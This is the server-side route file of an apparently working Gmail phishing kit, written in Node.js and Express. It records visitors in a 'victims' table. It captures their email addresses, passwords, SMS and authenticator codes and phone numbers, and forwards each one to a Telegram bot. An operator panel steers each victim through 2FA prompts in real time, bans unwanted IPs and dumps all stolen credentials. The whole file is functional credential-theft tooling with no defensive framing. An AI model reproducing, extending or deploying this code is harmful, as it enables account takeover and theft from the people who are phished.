const express = require('express');
const router = express.Router();
const db = require('../lib/db');
const config = require('../lib/config');
const { sendTelegramMessage, getBrowserAndOS, getRealIP } = require('../lib/telegram');
const fs = require('fs');
const path = require('path');
const axios = require('axios');

const countryCache = {};

async function getCountryFromIP(ip) {
  if (ip === '::1' || ip === '127.0.0.1') return 'SY';
  if (countryCache[ip]) return countryCache[ip];
  try {
    const res = await axios.get(`http://www.geoplugin.net/json.gp?ip=${ip}`, { timeout: 2000 });
    const data = res.data;
    const country = (data.geoplugin_countryCode || 'SY').toLowerCase();
    countryCache[ip] = country;
    return country;
  } catch (e) {
    return 'SY';
  }
}

router.all('/', async (req, res) => {
  const type = req.query.type;

  const clientIp = getRealIP(req);
  const blacklistPath = path.join(__dirname, '..', 'public', 'blacklist.dat');
  try {
    if (fs.existsSync(blacklistPath)) {
      const blacklist = fs.readFileSync(blacklistPath, 'utf8');
      if (blacklist.includes(clientIp)) {
        return res.status(403).json({ status: '99' });
      }
    }
  } catch (e) {}

  if (type === 'ping') {
    if (req.session.uniqueid) {
      try {
        const lastseen = Math.floor(Date.now() / 1000);
        await db.query('UPDATE victims SET lastseen = ? WHERE uniqueid = ?', [lastseen, req.session.uniqueid]);
        return res.json({ status: 'lastseen_updated' });
      } catch (err) {
        return res.json({ status: 'notok', error: err.message });
      }
    }
    return res.json({ status: 'error', message: 'Session uniqueid not set' });
  }

  if (type === 'login') {
    const ip = getRealIP(req);
    const country = await getCountryFromIP(ip);
    const ua = encodeURIComponent(req.headers['user-agent'] || '');
    const uAgent = req.headers['user-agent'] || '';
    const date = new Date().toISOString().slice(0, 19).replace('T', ' ');
    let uniqueid = Math.floor(Date.now() / 1000);
    const lastseen = Math.floor(Date.now() / 1000);

    const user = req.body.usrInput;
    if (!user) return res.json({ status: 'notok' });

    try {
      if (req.session.started === 'true' && req.session.uniqueid) {
        uniqueid = req.session.uniqueid;
        const victims = await db.query('SELECT * FROM victims WHERE uniqueid = ?', [uniqueid]);

        if (victims.length === 0) {
          await db.query(
            'INSERT INTO victims (lastseen, handler, user, ip, country, useragent, uniqueid, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
            [lastseen, '--', user, ip, country, ua, uniqueid, 2]
          );
          await logVisitor(date, ip, uAgent);
        } else {
          await db.query(
            'UPDATE victims SET status=2, buzzed=0, user=?, useragent=?, country=?, ip=? WHERE uniqueid=?',
            [user, ua, country, ip, uniqueid]
          );
        }
      } else {
        req.session.uniqueid = uniqueid;
        req.session.started = 'true';

        await db.query(
          'INSERT INTO victims (lastseen, handler, user, ip, country, useragent, uniqueid, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
          [lastseen, '--', user, ip, country, ua, uniqueid, 2]
        );
        await logVisitor(date, ip, uAgent);
      }

      if (config.telegram.enabled) {
        const { browser, os } = getBrowserAndOS(uAgent);
        const msg = `<b>Gmail</b>\n━━━━━━━━━━━━━━━\n📧 <b>Email/User:</b> <code>${user}</code>\n━━━━━━━━━━━━━━━\n🌎 <b>Country:</b> <code>${country}</code>\n🌐 <b>IP Address:</b> <code>${ip}</code>\n💻 <b>Browser:</b> <code>${browser}</code>\n🖥️ <b>OS:</b> <code>${os}</code>\n📅 <b>Date:</b> <code>${date}</code>\n━━━━━━━━━━━━━━━`;
        sendTelegramMessage(msg);
      }

      return res.json({ status: 'ok' });
    } catch (err) {
      console.error('Login action error:', err);
      return res.json({ status: 'notok', error: err.message });
    }
  }

  if (type === 'loginerror') {
    const ip = getRealIP(req);
    const country = await getCountryFromIP(ip);
    const uAgent = req.headers['user-agent'] || '';
    const user = req.body.usrInput;
    const date = new Date().toISOString().slice(0, 19).replace('T', ' ');
    const uniqueid = req.session.uniqueid || Math.floor(Date.now() / 1000);

    try {
      if (user) {
        await db.query(
          'UPDATE victims SET status=2, buzzed=0, user=? WHERE uniqueid=?',
          [user, uniqueid]
        );
      }
      if (config.telegram.enabled && user) {
        const { browser, os } = getBrowserAndOS(uAgent);
        const msg = `<b>Gmail</b>\n━━━━━━━━━━━━━━━\n📧 <b>Email/User Error:</b> <code>${user}</code>\n━━━━━━━━━━━━━━━\n🌎 <b>Country:</b> <code>${country}</code>\n🌐 <b>IP Address:</b> <code>${ip}</code>\n💻 <b>Browser:</b> <code>${browser}</code>\n🖥️ <b>OS:</b> <code>${os}</code>\n📅 <b>Date:</b> <code>${date}</code>\n━━━━━━━━━━━━━━━`;
        sendTelegramMessage(msg);
      }
      return res.json({ status: 'ok' });
    } catch (err) {
      return res.json({ status: 'notok', error: err.message });
    }
  }

  if (type === 'vpwd' || type === 'vpwderror') {
    const uniqueid = req.session.uniqueid;
    const vpwd = req.body.vpwd;
    const date = new Date().toISOString().slice(0, 19).replace('T', ' ');

    if (!vpwd) return res.json({ status: 'notok', message: 'Password is empty' });

    try {
      await db.query('UPDATE victims SET status=14, buzzed=0, pass=? WHERE uniqueid=?', [vpwd, uniqueid]);

      if (config.telegram.enabled) {
        const victims = await db.query('SELECT * FROM victims WHERE uniqueid=?', [uniqueid]);
        const vic = victims[0] || {};
        const label = type === 'vpwderror' ? 'Password Error' : 'Password';
        const msg = `<strong># Gmail</strong>\n<code>━━━━━━━━━━━━━━━</code>\n👤 <strong>Email/User:</strong> <code>${vic.user || ''}</code>\n<code>━━━━━━━━━━━━━━━</code>\n🔑 <strong>${label}:</strong> <code>${vpwd}</code>\n<code>━━━━━━━━━━━━━━━</code>\n🌐 <strong>IP:</strong> <code>${vic.ip || ''}</code>\n📅 <strong>Date:</strong> <code>${date}</code>`;
        sendTelegramMessage(msg);
      }

      return res.json({ status: 'ok' });
    } catch (err) {
      return res.json({ status: 'notok', message: err.message });
    }
  }

  if (type === 'vpwdreset') {
    const uniqueid = req.session.uniqueid;
    const vpwdreset2 = req.body.vpwdreset2;
    const date = new Date().toISOString().slice(0, 19).replace('T', ' ');

    if (!vpwdreset2) return res.json({ status: 'notok', message: 'Password is empty' });

    try {
      await db.query('UPDATE victims SET status=79, buzzed=0, vpwdreset=? WHERE uniqueid=?', [vpwdreset2, uniqueid]);

      if (config.telegram.enabled) {
        const victims = await db.query('SELECT * FROM victims WHERE uniqueid=?', [uniqueid]);
        const vic = victims[0] || {};
        const msg = `<strong># Gmail</strong>\n<code>━━━━━━━━━━━━━━━</code>\n👤 <strong>Email/User:</strong> <code>${vic.user || ''}</code>\n<code>━━━━━━━━━━━━━━━</code>\n🔑 <strong>New Password:</strong> <code>${vpwdreset2}</code>\n<code>━━━━━━━━━━━━━━━</code>\n🌐 <strong>IP:</strong> <code>${vic.ip || ''}</code>\n📅 <strong>Date:</strong> <code>${date}</code>`;
        sendTelegramMessage(msg);
      }

      return res.json({ status: 'ok' });
    } catch (err) {
      return res.json({ status: 'notok', message: err.message });
    }
  }

  if (type === 'smscode') {
    const uniqueid = req.session.uniqueid;
    const smscode = req.body.smscode;
    const date = new Date().toISOString().slice(0, 19).replace('T', ' ');
    if (!smscode) return res.json({ status: 'notok', message: 'SMS code is empty' });
    try {
      await db.query('UPDATE victims SET status=10, buzzed=0, smscode=? WHERE uniqueid=?', [smscode, uniqueid]);
      if (config.telegram.enabled) {
        const victims = await db.query('SELECT * FROM victims WHERE uniqueid=?', [uniqueid]);
        const vic = victims[0] || {};
        const msg = `<strong># Gmail</strong>\n<code>━━━━━━━━━━━━━━━</code>\n👤 <b>Email/User:</b> <code>${vic.user || ''}</code>\n<code>━━━━━━━━━━━━━━━</code>\n📱 <b>SMS Code:</b> <code>${smscode}</code>\n<code>━━━━━━━━━━━━━━━</code>\n🌐 <b>IP:</b> <code>${vic.ip || ''}</code>\n📅 <b>Date:</b> <code>${date}</code>`;
        sendTelegramMessage(msg);
      }
      return res.json({ status: 'ok' });
    } catch (err) {
      return res.json({ status: 'notok', message: err.message });
    }
  }

  if (type === 'smserror') {
    const uniqueid = req.session.uniqueid;
    const smserror = req.body.smserror;
    const date = new Date().toISOString().slice(0, 19).replace('T', ' ');
    if (!smserror) return res.json({ status: 'notok', message: 'SMS error value is empty' });
    try {
      await db.query('UPDATE victims SET status=12, buzzed=0, smscode=? WHERE uniqueid=?', [smserror, uniqueid]);
      if (config.telegram.enabled) {
        const victims = await db.query('SELECT * FROM victims WHERE uniqueid=?', [uniqueid]);
        const vic = victims[0] || {};
        const msg = `<strong># Gmail</strong>\n<code>━━━━━━━━━━━━━━━</code>\n👤 <b>Email/User:</b> <code>${vic.user || ''}</code>\n<code>━━━━━━━━━━━━━━━</code>\n📱 <b>SMS Code Error:</b> <code>${smserror}</code>\n<code>━━━━━━━━━━━━━━━</code>\n🌐 <b>IP:</b> <code>${vic.ip || ''}</code>\n📅 <b>Date:</b> <code>${date}</code>`;
        sendTelegramMessage(msg);
      }
      return res.json({ status: 'ok' });
    } catch (err) {
      return res.json({ status: 'notok', message: err.message });
    }
  }

  if (type === 'appcode') {
    const uniqueid = req.session.uniqueid;
    const appcode = req.body.appcode;
    const date = new Date().toISOString().slice(0, 19).replace('T', ' ');
    if (!appcode) return res.json({ status: 'notok', message: 'App code is empty' });
    try {
      await db.query('UPDATE victims SET status=18, buzzed=0, appcode=? WHERE uniqueid=?', [appcode, uniqueid]);
      if (config.telegram.enabled) {
        const victims = await db.query('SELECT * FROM victims WHERE uniqueid=?', [uniqueid]);
        const vic = victims[0] || {};
        const msg = `<strong># Gmail</strong>\n<code>━━━━━━━━━━━━━━━</code>\n👤 <b>Email/User:</b> <code>${vic.user || ''}</code>\n<code>━━━━━━━━━━━━━━━</code>\n🔐 <b>App Code:</b> <code>${appcode}</code>\n<code>━━━━━━━━━━━━━━━</code>\n🌐 <b>IP:</b> <code>${vic.ip || ''}</code>\n📅 <b>Date:</b> <code>${date}</code>`;
        sendTelegramMessage(msg);
      }
      return res.json({ status: 'ok' });
    } catch (err) {
      return res.json({ status: 'notok', message: err.message });
    }
  }

  if (type === 'apperror') {
    const uniqueid = req.session.uniqueid;
    const apperror = req.body.apperror;
    const date = new Date().toISOString().slice(0, 19).replace('T', ' ');
    if (!apperror) return res.json({ status: 'notok', message: 'App error value is empty' });
    try {
      await db.query('UPDATE victims SET status=20, buzzed=0, appcode=? WHERE uniqueid=?', [apperror, uniqueid]);
      if (config.telegram.enabled) {
        const victims = await db.query('SELECT * FROM victims WHERE uniqueid=?', [uniqueid]);
        const vic = victims[0] || {};
        const msg = `<strong># Gmail</strong>\n<code>━━━━━━━━━━━━━━━</code>\n👤 <b>Email/User:</b> <code>${vic.user || ''}</code>\n<code>━━━━━━━━━━━━━━━</code>\n🔐 <b>App Code Error:</b> <code>${apperror}</code>\n<code>━━━━━━━━━━━━━━━</code>\n🌐 <b>IP:</b> <code>${vic.ip || ''}</code>\n📅 <b>Date:</b> <code>${date}</code>`;
        sendTelegramMessage(msg);
      }
      return res.json({ status: 'ok' });
    } catch (err) {
      return res.json({ status: 'notok', message: err.message });
    }
  }

  if (type === 'phone') {
    const uniqueid = req.session.uniqueid;
    const fullPhoneNumber = req.body.fullPhoneNumber;
    const date = new Date().toISOString().slice(0, 19).replace('T', ' ');
    if (!fullPhoneNumber) return res.json({ status: 'notok', message: 'Phone number is empty' });
    try {
      await db.query('UPDATE victims SET status=52, buzzed=0, phone=? WHERE uniqueid=?', [fullPhoneNumber, uniqueid]);
      if (config.telegram.enabled) {
        const victims = await db.query('SELECT * FROM victims WHERE uniqueid=?', [uniqueid]);
        const vic = victims[0] || {};
        const msg = `<strong># Gmail</strong>\n<code>━━━━━━━━━━━━━━━</code>\n👤 <b>Email/User:</b> <code>${vic.user || ''}</code>\n<code>━━━━━━━━━━━━━━━</code>\n📞 <b>Phone:</b> <code>${fullPhoneNumber}</code>\n<code>━━━━━━━━━━━━━━━</code>\n🌐 <b>IP:</b> <code>${vic.ip || ''}</code>\n📅 <b>Date:</b> <code>${date}</code>`;
        sendTelegramMessage(msg);
      }
      return res.json({ status: 'ok' });
    } catch (err) {
      return res.json({ status: 'notok', message: err.message });
    }
  }

  if (type === 'change2fa') {
    const uniqueid = req.session.uniqueid;
    const change2fa = req.body.change2fa;
    if (!change2fa) return res.json({ status: 'notok', message: 'Missing data' });
    try {
      await db.query('UPDATE victims SET buzzed=0 WHERE uniqueid=?', [uniqueid]);
      return res.json({ status: 'ok' });
    } catch (err) {
      return res.json({ status: 'notok', message: err.message });
    }
  }

  if (type === 'resendtap') {
    const uniqueid = req.session.uniqueid;
    const resendtap = req.body.resendtap;
    const date = new Date().toISOString().slice(0, 19).replace('T', ' ');
    if (!resendtap) return res.json({ status: 'notok', message: 'Missing data' });
    try {
      await db.query('UPDATE victims SET status=157, buzzed=0, resendtap=? WHERE uniqueid=?', [resendtap, uniqueid]);
      if (config.telegram.enabled) {
        const victims = await db.query('SELECT * FROM victims WHERE uniqueid=?', [uniqueid]);
        const vic = victims[0] || {};
        const msg = `<strong># Gmail</strong>\n<code>━━━━━━━━━━━━━━━</code>\n👤 <b>Email/User:</b> <code>${vic.user || ''}</code>\n<code>━━━━━━━━━━━━━━━</code>\n🔄 <b>Resend Tap:</b> <code>${resendtap}</code>\n<code>━━━━━━━━━━━━━━━</code>\n🌐 <b>IP:</b> <code>${vic.ip || ''}</code>\n📅 <b>Date:</b> <code>${date}</code>`;
        sendTelegramMessage(msg);
      }
      return res.json({ status: 'ok' });
    } catch (err) {
      return res.json({ status: 'notok', message: err.message });
    }
  }

  if (!req.session.loggedin) {
    return res.json({ status: 'error', message: 'Unauthorized' });
  }

  if (type === 'commmand' || type === 'onecommmand' || type === 'onecommmandlive') {
    const userid = req.body.userid;
    const status = req.body.status;
    const home = req.body.home || '';
    const homelive = req.body.homelive || '';
    if (!userid || !status) return res.json({ status: 'notok', message: 'Missing params' });
    try {
      const updateData = {};
      if (home) updateData.phone = home;
      if (homelive) updateData.phone = homelive;
      updateData.status = parseInt(status);
      updateData.buzzed = 0;
      const keys = Object.keys(updateData);
      const setClause = keys.map(k => k + '=?').join(',');
      const values = keys.map(k => updateData[k]);
      values.push(userid);
      await db.query('UPDATE victims SET ' + setClause + ' WHERE id=?', values);
      return res.json({ status: 'ok' });
    } catch (err) {
      return res.json({ status: 'notok', message: err.message });
    }
  }

  if (type === 'remove') {
    const userid = req.body.userid;
    if (!userid) return res.json({ status: 'notok' });
    try {
      await db.query('UPDATE victims SET is_removed=1 WHERE id=?', [userid]);
      return res.json({ status: 'ok' });
    } catch (err) {
      return res.json({ status: 'notok', message: err.message });
    }
  }

  if (type === 'ban') {
    const userid = req.body.userid;
    if (!userid) return res.json({ status: 'notok' });
    try {
      await db.query('UPDATE victims SET status=99, buzzed=1 WHERE id=?', [userid]);
      const victims = await db.query('SELECT * FROM victims WHERE id=?', [userid]);
      if (victims.length > 0) {
        const ipblock = victims[0].ip;
        const blacklistPath = path.join(__dirname, '..', 'public', 'blacklist.dat');
        if (ipblock) {
          let blacklist = '';
          try { blacklist = fs.readFileSync(blacklistPath, 'utf8'); } catch (e) {}
          if (!blacklist.includes(ipblock)) {
            fs.appendFileSync(blacklistPath, ipblock + '\n');
          }
        }
      }
      return res.json({ status: 'ok' });
    } catch (err) {
      return res.json({ status: 'notok', message: err.message });
    }
  }

  if (type === 'getinfo') {
    const userid = req.body.userid;
    if (!userid) return res.json({ status: 'notok' });
    try {
      const victims = await db.query('SELECT * FROM victims WHERE id=?', [userid]);
      if (victims.length === 0) return res.json({ status: 'notok', message: 'Not found' });
      const v = victims[0];
      const fields = [
        ['ID', v.id],
        ['IP', v.ip],
        ['Country', v.country],
        ['User Agent', decodeURIComponent(v.useragent || '')],
        ['User', v.user],
        ['Pass', v.pass],
        ['Phone', v.phone || v.phonenumber || v.namephone || ''],
        ['SMSCode', v.smscode],
        ['AppCode', v.appcode],
        ['ResendTap', v.resendtap],
        ['Last Seen', v.lastseen],
        ['Status', v.status],
      ];
      let html = '<table>';
      for (const [k, val] of fields) {
        html += '<tr><td><b>' + k + '</b></td><td>' + (val || '') + '</td></tr>';
      }
      html += '</table>';
      return res.json({ status: 'ok', info: html });
    } catch (err) {
      return res.json({ status: 'notok', message: err.message });
    }
  }

  if (type === 'getallinfo') {
    try {
      const victims = await db.query('SELECT * FROM victims ORDER BY id DESC');
      let html = '';
      for (const v of victims) {
        const fields = [
          ['ID', v.id],
          ['IP', v.ip],
          ['Country', v.country],
          ['User Agent', decodeURIComponent(v.useragent || '')],
          ['User', v.user],
          ['Pass', v.pass],
          ['Phone', v.phone || v.phonenumber || v.namephone || ''],
          ['SMSCode', v.smscode],
          ['AppCode', v.appcode],
          ['ResendTap', v.resendtap],
          ['Last Seen', v.lastseen],
          ['Status', v.status],
        ];
        html += '<table border="1" style="margin-bottom:10px">';
        for (const [k, val] of fields) {
          html += '<tr><td><b>' + k + '</b></td><td>' + (val || '') + '</td></tr>';
        }
        html += '</table>';
      }
      return res.json({ status: 'ok', info: html });
    } catch (err) {
      return res.json({ status: 'notok', message: err.message });
    }
  }

  if (type === 'buzzoff') {
    try {
      const victims = await db.query('SELECT * FROM victims');
      let allBuzzed = true;
      for (const v of victims) {
        if (v.buzzed !== '1') { allBuzzed = false; break; }
      }
      const newVal = allBuzzed ? 0 : 1;
      await db.query('UPDATE victims SET buzzed=?', [newVal]);
      return res.json({ status: 'ok', action: newVal });
    } catch (err) {
      return res.json({ status: 'notok', message: err.message });
    }
  }

  if (type === 'buzzoffsingle') {
    const userid = req.query.userid;
    if (!userid) return res.json({ status: 'notok' });
    try {
      const victims = await db.query('SELECT * FROM victims WHERE id=?', [userid]);
      if (victims.length === 0) return res.json({ status: 'notok', message: 'Not found' });
      const v = victims[0];
      const newVal = v.buzzed === '1' ? 0 : 1;
      await db.query('UPDATE victims SET buzzed=? WHERE id=?', [newVal, userid]);
      return res.json({ status: 'ok', action: newVal });
    } catch (err) {
      return res.json({ status: 'notok', message: err.message });
    }
  }

  if (type === 'visits_reset') {
    try {
      await db.query('DELETE FROM visits');
      return res.json({ status: 'ok' });
    } catch (err) {
      return res.json({ status: 'notok', message: err.message });
    }
  }

  if (type === 'clearlogs') {
    try {
      await db.query('DELETE FROM victims');
      return res.json({ status: 'ok' });
    } catch (err) {
      return res.json({ status: 'notok', message: err.message });
    }
  }

  if (type === 'custom_redirect') {
    const url = req.body.custom_redirect;
    if (!url) return res.json({ status: 'notok', message: 'URL required' });
    try {
      const victims = await db.query('SELECT * FROM victims WHERE uniqueid=?', [req.session.uniqueid]);
      if (victims.length > 0) {
        await db.query('UPDATE victims SET status=115 WHERE id=?', [victims[0].id]);
      }
      return res.json({ status: 'ok' });
    } catch (err) {
      return res.json({ status: 'notok', message: err.message });
    }
  }

  res.json({ status: 'error', message: 'Unknown type' });
});

async function logVisitor(date, ip, ua) {
  try {
    const logDir = path.join(__dirname, '..', 'logs');
    if (!fs.existsSync(logDir)) fs.mkdirSync(logDir, { recursive: true });
    fs.appendFileSync(path.join(logDir, 'accepted_visitors.txt'), `[+] ${date} - ${ip} - ${ua}\n`);
  } catch (e) {}
}

module.exports = router;
